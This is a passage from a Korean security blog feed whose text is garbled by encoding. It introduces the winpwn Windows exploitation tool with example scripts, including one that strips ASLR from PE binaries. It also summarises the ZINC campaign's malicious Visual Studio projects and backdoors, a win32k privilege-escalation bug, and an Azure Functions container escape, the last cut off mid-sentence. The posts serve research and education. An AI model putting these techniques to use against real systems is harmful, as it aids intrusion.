ì„¹ì‹œí•´ì•¼ í•˜ì£ </p></blockquote><p><em><del>ì˜¤ëŠ˜ë¶€í„°</del></em> ì œ ì¢Œìš°ëª…ì…ë‹ˆë‹¤. ë°‘ë„ ëë„ ì—†ì´ coolí•˜ê³  sexyí•˜ê²Œ í¬ë„ˆë¸”ì„ ë¿Œìˆ˜ëŠ” ê²ƒì„ ëª©í‘œë¡œ í•˜ëŠ” ì‹œë¦¬ì¦ˆì…ë‹ˆë‹¤.</p><p>ê·¸ë˜ë„ ê³„íšì€ ì„¸ìš°ê³  ë¿Œì…”ì•¼ê² ìŠµë‹ˆë‹¤.</p><ul><li>íˆ´ ì†Œê°œ</li><li>Windows exploit technique</li><li>CTF Challenge</li></ul><p>ì •ë„ë¡œ ì§„í–‰ë  ì˜ˆì •ì´ë©° part 5ê¹Œì§€ êµ¬ìƒì¤‘ì´ì§€ë§Œ ë­ ì‚¬ëŒ ì¼ì€ ì–´ë–»ê²Œ ë ì§€ ëª¨ë¥´ëŠ”ê±°ë‹ˆ ì¼ë‹¨ ì‹œì‘í•´ë³´ì£  ã… ì‹œë¦¬ì¦ˆ ì²« ê¸€ì€ ê°€ë³ê²Œ ì¶œë°œí•˜ê¸° ìœ„í•´ ê°„ë‹¨í•œ Windows íˆ´ ì†Œê°œ ì •ë„ë¡œ í•˜ë ¤ê³  í•©ë‹ˆë‹¤.</p><h1 id="pwntools-for-windows-winpwn"><a href="#pwntools-for-windows-winpwn" class="headerlink" title="pwntools for windows - winpwn"></a>pwntools for windows - winpwn</h1><p>í¬ë„ˆë¸”ì„ ê³µë¶€í•˜ì…¨ë˜ ë¶„ë“¤ì´ë¼ë©´ pwntoolsì€ ëª¨ë¥´ì‹œëŠ” ë¶„ì´ ì—†ì„ ê±°ë¼ê³  ìƒê°í•©ë‹ˆë‹¤. ë¦¬ëˆ…ìŠ¤ í¬ë„ˆë¸”ì„ í•  ë•Œ ê¼­ í•„ìš”í•œ íˆ´ì´ì£ .<br>ê·¸ëŸ°ë°..! pwntoolsì€ ìœˆë„ìš° í™˜ê²½ì˜ ìµìŠ¤í”Œë¡œì‡ì€ ì§€ì›í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ã… ã…  </p><p><a href="https://github.com/Byzero512/winpwn">winpwn</a>ì€ ê¸°ì¡´ pwntoolsì—ì„œ ê³µì‹ì ìœ¼ë¡œ ì§€ì›í•˜ì§€ ì•ŠëŠ” ìœˆë„ìš° í™˜ê²½ì˜ ë°”ì´ë„ˆë¦¬ ë¶„ì„, ìµìŠ¤í”Œë¡œì‡ì„ ìœ„í•œ íˆ´ì…ë‹ˆë‹¤. pwintoolsì´ë€ ì´ë¦„ì˜ ë¹„ìŠ·í•œ ê¸°ëŠ¥ì„ ì§€ì›í•˜ëŠ” ëª¨ë“ˆë„ ìˆë˜ë°, ì œ ê¸°ì¤€ì—ì„œëŠ” winpwnì´ ì“°ê¸°ì— ë” í¸í•˜ë”ë¼êµ¬ìš”. ê·¸ë˜ì„œ ì˜¤ëŠ˜ì€ winpwnì— ëŒ€í•´ ì§§ê²Œ ì†Œê°œí•´ë³´ê² ìŠµë‹ˆë‹¤.</p><h1 id="ì„¤ì¹˜"><a href="#ì„¤ì¹˜" class="headerlink" title="ì„¤ì¹˜"></a>ì„¤ì¹˜</h1><p><code>pip/pip3 install winpwn</code> ìœ¼ë¡œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ë§Œ ë””ë²„ê±° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì•„ë˜ ê³¼ì •ì´ ì¶”ê°€ë¡œ í•„ìš”í•©ë‹ˆë‹¤.</p><ol><li><code>C:\\Users\\[ì‚¬ìš©ì]</code> ê²½ë¡œì— <a href="https://github.com/Byzero512/winpwn/blob/master/.winpwn">.winpwn</a> íŒŒì¼ì„ ìƒì„±í•´ ì„¤ì¹˜ë˜ì–´ ìˆëŠ” ë””ë²„ê±° ê²½ë¡œë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì´í›„ì— ë””ë²„ê±°ë¥¼ ì‚¬ìš©í•  ë•Œ ì½”ë“œì—ì„œ ì§ì ‘ ì„¤ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</li><li>ë‹¤ìŒ íŒŒì´ì¬ íŒ¨í‚¤ì§€ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤<ul><li>pip install pefile</li><li>pip install keystone</li><li>pip install capstone</li></ul></li></ol><p>keystone ì„¤ì¹˜ ì‹œ ë°œìƒí•˜ëŠ” ì—ëŸ¬ëŠ” Visual C++ Compiler for Python 2.7 ë˜ëŠ” OpenSSL ì„¤ì¹˜ë¡œ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ë¶ˆì¹œì ˆí•œ ì„¤ì¹˜ ì—ëŸ¬ ë©”ì‹œì§€..</p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/3.png"></p><blockquote><p>ê·¸ë˜ë„ íŒŒì´ì¬ì¸ê²Œ ì–´ë””ì—ìš” ã…‹ã…‹</p></blockquote><p>ì¶”ê°€ë¡œ Windows Terminalì„ ì‚¬ìš©í•´ì•¼ ì˜ˆì˜ê²Œ ì¶œë ¥ë˜ëŠ” ê±¸ ë³¼ ìˆ˜ ìˆìœ¼ë‹ˆ Microsoft Storeì—ì„œ ì„¤ì¹˜í•´ì£¼ì„¸ìš”. Windows Terminalì„ ì„¤ì¹˜í•˜ì…¨ë‹¤ë©´ ì´ì œë¶€í„° cmdë‘ íŒŒì›Œì‰˜ ê°–ë‹¤ ë²„ë¦¬ê³  ì´ê±° ì“°ì‹œë©´ ë©ë‹ˆë‹¤. </p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/6.png"></p><blockquote><p>Windows Terminal ì“°ì„¸ìš”!! ë‘ ë²ˆ ì“°ì„¸ìš”!!!</p></blockquote><h1 id="ê¸°ëŠ¥"><a href="#ê¸°ëŠ¥" class="headerlink" title="ê¸°ëŠ¥"></a>ê¸°ëŠ¥</h1><p>ì„¤ì¹˜ë„ í–ˆìœ¼ë‹ˆ ì–´ë–¤ ê¸°ëŠ¥ë“¤ì´ ìˆëŠ”ì§€ ì“°ìœ½ ë‘˜ëŸ¬ë´ì•¼ê² ì£ ? </p><p>ìš°ì„  ê¸°ì¡´ pwntoolsì—ì„œ ì œê³µí•˜ëŠ” ê¸°ë³¸ì ì¸ ê¸°ëŠ¥ë“¤ì€ ëŒ€ë¶€ë¶„ ì§€ì›í•˜ë©° ê±°ê¸°ì— Windowsì—ì„œ ì‚¬ìš©í•˜ëŠ” PE ë°”ì´ë„ˆë¦¬ ë¶„ì„ì„ ìœ„í•´ ì§€ì›í•˜ëŠ” ëª‡ ê°€ì§€ ê¸°ëŠ¥ì´ ì¶”ê°€ë˜ì—ˆì£ . ì§€ê¸ˆë¶€í„° í•˜ë‚˜ì”© ì‚´í´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><h2 id="Debugger-attach"><a href="#Debugger-attach" class="headerlink" title="Debugger attach"></a>Debugger attach</h2><p>ê¸°ì¡´ pwntoolsì—ì„œëŠ” <code>gdb.attach()</code> ë¥¼ ì‚¬ìš©í•´ gdbì— attach í•  ìˆ˜ ìˆì—ˆë‹¤ë©´ pwintoolsì—ì„œëŠ” <code>windbg.attach()</code> ì„ ì‚¬ìš©í•´ ë°”ì´ë„ˆë¦¬ë¥¼ windbgì— attach í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. windbg preview, x64dbg, mingw gdbë„ ì‚¬ìš©ì´ ê°€ëŠ¥í•˜ë©° ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ ë“±ì˜ scriptë„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê°„ë‹¨í•œ ì˜ˆì œë¡œ windbg previewì— attach í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#.winpwn ì„¤ì •í•˜ì§€ ì•Šì•˜ì„ê²½ìš° ì‘ì„±</span><span class="hljs-comment">#context.debugger=&quot;windbgx&quot;</span><span class="hljs-comment">#context.windbgx=&quot;C:\\Users\\dw0rdptr\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span>p = process(<span class="hljs-string">&quot;./binary.exe&quot;</span>)windbgx.attach(p, script=<span class="hljs-string">&quot;bp 0xbe1106&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">40</span>)input()</code></pre><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/4.png"></p><p>ìœ„ ì‚¬ì§„ê³¼ ê°™ì´ windbg previewë„ ì˜ ë¶™ê³ , ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ë„ ì•„ì£¼ ì˜ ê±¸ë¦° ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë„˜ë‚˜ í¸í•œê²ƒâ€¦</p><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><p>pwntoolsì—ì„œ <code>elf</code>ë¡œ ë°”ì´ë„ˆë¦¬ë¥¼ ì—´ì–´ í•¨ìˆ˜ ì£¼ì†Œì„ êµ¬í•˜ë“¯ì´ winpwnì—ì„œëŠ” <code>winfile</code> ë¡œ pe íŒŒì¼ì„ ì—´ì–´ <code>symbols</code> í•¨ìˆ˜ë¡œ ë°”ì´ë„ˆë¦¬ì™€ dllì˜ í•¨ìˆ˜ ì£¼ì†Œì˜ IAT/EAT offsetì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">&quot;debug&quot;</span>context.arch=<span class="hljs-string">&quot;i386&quot;</span>p = process(<span class="hljs-string">&quot;./binary.exe&quot;</span>)pe = winfile(<span class="hljs-string">&quot;./binary.exe&quot;</span>)ntdll = winfile(<span class="hljs-string">&quot;./ntdll.dll&quot;</span>)print(<span class="hljs-string">&quot;exit offset : &quot;</span>+hex(pe.symbols[<span class="hljs-string">&quot;exit&quot;</span>]))print(<span class="hljs-string">&quot;RtlInitializeSListHead :&quot;</span>+hex(ntdll.symbols[<span class="hljs-string">&quot;RtlInitializeSListHead&quot;</span>]))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">20</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)</code></pre><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/5.png"></p><p>ë°”ì´ë„ˆë¦¬ì™€ <code>ntdll.dll</code>ì„ ë¡œë“œí•´ ê° ëª¨ë“ˆì˜ í•¨ìˆ˜ ì˜¤í”„ì…‹ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê·¸ ì™¸ì—ë„ <code>context.log_level</code>ì„ <code>debug</code>ë¡œ ì„¤ì •í•´ pwntoolsì—ì„œ ìµìˆ™í•˜ê²Œ ë´¤ë˜ send, receive ì •ë³´ê°€ ì¶œë ¥ë˜ëŠ” ê²ƒë„ ë³¼ ìˆ˜ ìˆë„¤ìš”!</p><h2 id="Disable-DYNAMICBASE"><a href="#Disable-DYNAMICBASE" class="headerlink" title="Disable DYNAMICBASE"></a>Disable DYNAMICBASE</h2><p>winpwnì—ì„œëŠ” í•„ìš”í•œ ê²½ìš° ë°”ì´ë„ˆë¦¬ê°€ ë¡œë“œë˜ëŠ” ì‹œì‘ ì£¼ì†Œë¥¼ ëœë¤í•˜ê²Œ ë°°ì¹˜í•˜ëŠ” DynamicBase ê¸°ëŠ¥ì„ ê°„í¸í•˜ê²Œ ë„ê³  í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ì¼ì´ ë°”ì´ë„ˆë¦¬ì˜ <code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</code> ì„¹ì…˜ì„ ìˆ˜ì •í•  í•„ìš”ê°€ ì—†ì£ </p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NOPIE</span>(<span class="hljs-params">fpath=<span class="hljs-string">&quot;&quot;</span></span>):</span>    <span class="hljs-keyword">import</span> pefile    pe_fp=pefile.PE(fpath)    pe_fp.OPTIONAL_HEADER.DllCharacteristics &amp;= \        ~pefile.DLL_CHARACTERISTICS[<span class="hljs-string">&quot;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&quot;</span>]    pe_fp.OPTIONAL_HEADER.CheckSum = pe_fp.generate_checksum()    pe_fp.write(fpath)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PIE</span>(<span class="hljs-params">fpath=<span class="hljs-string">&quot;&quot;</span></span>):</span>    <span class="hljs-keyword">import</span> pefile    pe_fp=pefile.PE(fpath)    pe_fp.OPTIONAL_HEADER.DllCharacteristics |= \        pefile.DLL_CHARACTERISTICS[<span class="hljs-string">&quot;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&quot;</span>]    pe_fp.OPTIONAL_HEADER.CheckSum = pe_fp.generate_checksum()    pe_fp.write(fpath)</code></pre><p><code>NOPIE(&quot;./binary.exe&quot;)</code> í˜¹ì€ <code>PIE(&quot;./binary.exe&quot;)</code> ë¡œ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.</p><p>ìœ„ì—ì„œ ì„¤ëª…í•œ ê¸°ëŠ¥ ì™¸ì—ë„ í”„ë¡œì„¸ìŠ¤ ë©”ëª¨ë¦¬ë¥¼ ì½ê³  ì“¸ ìˆ˜  ìˆëŠ” <code>readm</code>, <code>writem</code> ë“± ìœ ìš©í•œ ê¸°ëŠ¥ì´ ë§ìŠµë‹ˆë‹¤. ê·¸ ì™¸ì˜ ê¸°ëŠ¥ë“¤ì€ pwntoolsë¥¼ ë§Œì ¸ë³´ì…¨ë˜ ë¶„ë“¤ì´ë¼ë©´ ë˜‘ê°™ìœ¼ë‹ˆ ê¸ˆë°© ìµìˆ™í•´ì§ˆ ê²ë‹ˆë‹¤..!</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p>ìœˆë„ìš° í¬ë„ˆë¸”ì„ ì‹œì‘í•  ë•Œ ì§„ì…ì¥ë²½ì´ ìƒˆë¡œìš´ í™˜ê²½ê³¼ íˆ´ì¸ë°, ìµìˆ™í•œ íˆ´ì„ ì‚¬ìš©í•´ ì ‘ê·¼í•˜ë©´ ê´œì°®ì§€ ì•Šì„ê¹Œ í•˜ê³  ì†Œê°œí•œ íˆ´ì´ì—ˆìŠµë‹ˆë‹¤!<br>ë‹¤ìŒ ê¸€ì—ì„œëŠ” Windowsì˜ Low Fragmentation Heapì„ ì£¼ì œë¡œ ëŒì•„ì˜¤ê² ìŠµë‹ˆë‹¤.  </p><p>coolí•˜ê³  sexyí•˜ê²Œ í¬ë„ˆë¸”ì„ ë¶€ìˆ˜ëŠ” ê·¸ë‚ ê¹Œì§€..!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>pwnable</tag>
      
      <tag>L0ch</tag>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ZINC attacks against security researchers</title>
    <link href="/2021/01/30/fabu1ous/2021-01-30/"/>
    <url>/2021/01/30/fabu1ous/2021-01-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/">ZINC attacks against security researchers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Security researchers using Windows machine</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MSTIC(Microsoft Threat Intelligence Center)ì—ì„œ ZINCë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ì¶”ì  ì¤‘ì¸ Actorì˜ ì•…ì„± í–‰ìœ„ë¥¼ íƒì§€í–ˆë‹¤ê³  ë°œí‘œí–ˆìŠµë‹ˆë‹¤. </p><ul><li><p>Social Engineering</p><p>ZINCëŠ” ì‚¬íšŒ ê³µí•™ì  í•´í‚¹ì„ í†µí•´ ë³´ì•ˆ ì—°êµ¬ì›ë“¤ì—ê²Œ ì ‘ê·¼í•´ ê·¸ë“¤ì—ê²Œ ì•…ì„± íŒŒì¼ì„ ë°°í¬í–ˆìŠµë‹ˆë‹¤.</p><ul><li><p>SNS</p><p>ZINCëŠ” ë†’ì€ í€„ë¦¬í‹°ì˜ ì½˜í…ì¸ ë¥¼ ë¦¬íŠ¸ìœ—í•˜ëŠ” ì—¬ëŸ¬ íŠ¸ìœ„í„° ê³„ì •ì„ ìš´ì˜í•˜ë©´ì„œ ëŒ€ëµ 2000ëª…ì˜ íŒ”ë¡œì›Œë¥¼ ëª¨ìœ¼ëŠ” ë“± ë³´ì•ˆ ì»¤ë®¤ë‹ˆí‹°ì—ì„œ ì…ì§€ë¥¼ ë„“í˜”ìŠµë‹ˆë‹¤. SNSë¥¼ í†µí•´ ì ì¬ì  íƒ€ê²Ÿì—ì„œ ì ‘ê·¼ í›„ ë³´ì•ˆ ê´€ë ¨ ì´ìŠˆë‚˜ exploit ê¸°ìˆ ì— ëŒ€í•œ ì§ˆë¬¸ì„ ì£¼ê³ ë°›ì•„ ì‹ ë¢°ë¥¼ ìŒ“ê³ , emailì´ë‚˜ discordë¥¼ í†µí•´ pgp protected zipí˜•ì‹ìœ¼ë¡œ ì•…ì„± íŒŒì¼ì„ ê³µìœ í•©ë‹ˆë‹¤.</p></li><li><p>Blog</p><p>ZINCëŠ” br0vvnnì´ë¼ëŠ” ì´ë¦„ì˜ ë¸”ë¡œê·¸ë¥¼ ìš´ì˜í•©ë‹ˆë‹¤. ê·¸ ë¸”ë¡œê·¸ì˜ <code>DOS2RCE: A New Technique To Exploit V8 NULL Pointer Dereference Bug</code>ë¼ëŠ” ê¸€ì´ íŠ¸ìœ„í„°ë¡œ ê³µìœ ë˜ì—ˆìœ¼ë©° ì´ ë¸”ë¡œê·¸ ë§í¬ë¥¼ chromeìœ¼ë¡œ ì—´ì–´ë³¸ ì‹œìŠ¤í…œì€ malwareì— ê°ì—¼ë˜ì—ˆìŠµë‹ˆë‹¤.</p></li></ul></li><li><p>Malware</p><p>ì‚¬íšŒ ê³µí•™ì  í•´í‚¹ì„ í†µí•´ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì„¤ì¹˜ëœ backdoorëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. </p><ul><li><p>Malicious VS project</p><p>Prebuilt-binaryê°€ í¬í•¨ëœ ì•…ì„± Visual Studio í”„ë¡œì íŠ¸ì…ë‹ˆë‹¤. ê·¸ì¤‘ í•˜ë‚˜ëŠ” Browse.vc.dbë¥¼ ê°€ì¥í•œ ì•…ì„± Comebacker DLLë¡œ, íƒ€ê²Ÿ ì‹œìŠ¤í…œì—ì„œ dropper ì—­í• ì„ í•©ë‹ˆë‹¤. ì´ ì•…ì„± í”„ë¡œì íŠ¸ê°€ ë¹Œë“œë  ë•Œ Pre-build eventë¡œ ë“±ë¡ëœ PowerShell commandê°€ <code>rundll32</code>ë¥¼ í†µí•´ Combacker DLLì„ ì‹¤í–‰í•©ë‹ˆë‹¤. </p></li><li><p>Klackring malware</p><p>ì•…ì„± ì„œë¹„ìŠ¤ë¥¼ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì‹¬ëŠ” DLLì…ë‹ˆë‹¤. dropperë¥¼ í†µí•´ <code>C:\Windows\system32</code>ì— <code>.sys</code>í™•ì¥ìë¡œ ì„¤ì¹˜ë©ë‹ˆë‹¤. </p></li><li><p>MHTML</p></li><li><p>Viraglt64.sys</p><p>CVE-2017-16238 ì·¨ì•½ì ì´ ì¡´ì¬í•˜ëŠ” êµ¬ë²„ì „ ë“œë¼ì´ë²„ì…ë‹ˆë‹¤. dropperì— ì˜í•´ <code>C:\Windows\System32\drivers\circlassio.sys</code>ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì„¤ì¹˜ë©ë‹ˆë‹¤. ZINCëŠ” CVE-2017-16238ë¥¼ ì‚¬ìš©í•œ 1-day ê³µê²©ì„ í†µí•´ íƒ€ê²Ÿ ì‹œìŠ¤í…œ kernelì— write ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p></li></ul></li><li><p>C2 communication</p><p>backdoorëŠ” command-and-control(C2) ì±„ë„ì— 60ì´ˆë§ˆë‹¤ í•œë²ˆì”© check in í•©ë‹ˆë‹¤. ZINCëŠ” ì´ ì±„ë„ì„ ì‚¬ìš©í•´ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì›ê²© ì½”ë“œ ì‹¤í–‰, íƒ€ê²Ÿì˜ ipì£¼ì†Œ í™•ë³´, NetBIOS í™•ë³´ ë“±ì˜ í–‰ìœ„ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>social engineering</tag>
      
      <tag>backdoor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Windows ì»¤ë„ ëª¨ë“œ ê·¸ë˜í”½ ëª¨ë“ˆì˜ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/01/29/l0ch/2021-01-29/"/>
    <url>/2021/01/29/l0ch/2021-01-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/1/27/zdi-can-12671-windows-kernel-dosprivilege-escalation-via-a-null-pointer-deref">ZDI-CAN-12671: WINDOWS KERNEL DOS/PRIVILEGE ESCALATION VIA A NULL POINTER DEREF</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>win32kfull.sys (Windows 32bit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows kernel ëª¨ë“ˆì¸ <code>win32kfull.sys</code>ì—ì„œ NULL pointer dereferenceë¡œ ì¸í•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>win32kì—ì„œ ëª¨ë“  ê·¸ë¦¬ê¸° ì‘ì—…ì€ <code>SURFOBJ</code> êµ¬ì¡°ì²´ë¥¼ í†µí•´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. <code>SURFOBJ</code> ì˜ <code>hdev</code> í•„ë“œëŠ” íŠ¹ì • ì¥ì¹˜ ë“œë¼ì´ë²„ì— ëŒ€í•œ í•¸ë“¤ì´ë©° <code>flags</code> í•„ë“œ ì¤‘ ì¼ë¶€ëŠ” <code>HOOK_ *</code> í”Œë˜ê·¸ë¡œ, <a href="https://docs.microsoft.com/en-us/windows/win32/api/winddi/nf-winddi-engassociatesurface">ì—¬ê¸°ì—ì„œ</a> í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ <code>PlgBlt</code> ê·¸ë¦¬ê¸° ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ”  <code>win32kfull.sys!BLTRECORD::bRotate</code>ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. <code>HOOK_PLGBLT</code>ê°€ <code>SURFOBJ</code>ì˜ <code>flags</code> í•„ë“œì— ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´ ê¸°ë³¸ ì¥ì¹˜ ë“œë¼ì´ë²„ì˜ <code>DrvPlgBlt</code>ê°€ ì‚¬ìš©ë˜ëŠ”ë°, ì´ë•Œ <code>hdev</code>ì—ì„œ ì§€ì •í•œ ë“œë¼ì´ë²„ê°€ ë„¤ì´í‹°ë¸Œ <code>DrvPlgBlt</code>ë¥¼ ì§€ì›í•˜ëŠ”ì§€ í™•ì¸í•˜ì§€ ì•Šì•„ ì´ë¥¼ ì§€ì›í•˜ì§€ ì•ŠëŠ” ê²½ìš° í•´ë‹¹ í…Œì´ë¸”ì˜ í•­ëª©ì´ NULLì´ ë˜ê³  <code>win32kfull.sys!BLTRECORD::bRotate</code>ì—ì„œ NULL ì£¼ì†Œë¥¼ í˜¸ì¶œí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì„ ì•…ìš©í•  ë•Œ ê¸°ë³¸ì ìœ¼ë¡œ Windows ì‹œìŠ¤í…œì—ì„œëŠ” ìœ ì € ëª¨ë“œ í”„ë¡œì„¸ìŠ¤ì—ì„œ NULL í˜ì´ì§€ë¥¼ ë§¤í•‘í•  ìˆ˜ ì—†ì§€ë§Œ 16ë¹„íŠ¸ ìœ ì € ëª¨ë“œ í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” NULL í˜ì´ì§€ ë§¤í•‘ì´ ê°€ëŠ¥í•´ 16ë¹„íŠ¸ ê°€ìƒ ë„ìŠ¤ ë¨¸ì‹ ì¸ NTVDMì´ ì„¤ì¹˜ë˜ì–´ ìˆê³ , SMEP ì ìš©ì´ ë˜ì§€ ì•Šì€ Windows 32 bitì—ì„œë§Œ ì œí•œì ì¸ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Microsoft Azure Functionsì„ í†µí•œ Docker Container Escape</title>
    <link href="/2021/01/28/idioth/2021-01-28/"/>
    <url>/2021/01/28/idioth/2021-01-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.intezer.com/blog/research/how-we-hacked-azure-functions-and-escaped-docker/">How We Hacked Azure Functions and Escaped Docker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Azure Functions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft <a href="https://azure.microsoft.com/ko-kr/services/functions/">Azure Functions</a>ì—ì„œ ê¶Œí•œ ìƒìŠ¹ ë° Azure Functions ë„ì»¤ ì»¨í…Œì´ë„ˆë¥¼ escape í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>Azure Functionsì€ AWSì˜ Lambda ì„œë¹„ìŠ¤ì²˜ëŸ¼ ì¸í”„ë¼ì˜ provisionì´ë‚˜ ê´€ë¦¬ ì—†ì´ ìœ ì €ê°€ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì…ë‹ˆë‹¤. Azure Functionsì€ HTTP requestë¥¼ í†µí•´ íŠ¸ë¦¬ê±° í•  ìˆ˜ ìˆìœ¼ë©° Azure-managed containerì—ì„œ ì½”ë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><p>Azure Functionsì˜ Mesh ë°”ì´ë„ˆë¦¬ëŠ” syscall_mount ë“±ì˜ mount ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ë¯€ë¡œ ê¶Œí•œ ì—†ëŠ” ì‚¬ìš©ìê°€ HTTP ì„œë²„ë¥¼ í†µí•´ í•´ë‹¹ ì„œë¹„ìŠ¤ì— ì ‘ê·¼í•˜ë©´ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Mesh ë°”ì´ë„ˆë¦¬ì— ì¡´ì¬í•˜ëŠ” <code>mount_RunSquash</code> í•¨ìˆ˜ëŠ” <a href="https://github.com/vasi/squashfuse">squashfuse_II</a> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ <code>filePath</code> ê²½ë¡œì— ì§€ì •ëœ squashfs ì´ë¯¸ì§€ë¥¼ <code>targetPath</code> ê²½ë¡œì— ë§ˆìš´íŠ¸ í•©ë‹ˆë‹¤. <a href="https://linux.die.net/man/5/sudoers">sudoers</a> ë©”ì»¤ë‹ˆì¦˜ì„ í†µí•´ ì‚¬ìš©ìì—ê²Œ ë£¨íŠ¸ ê¶Œí•œì„ ì£¼ëŠ” 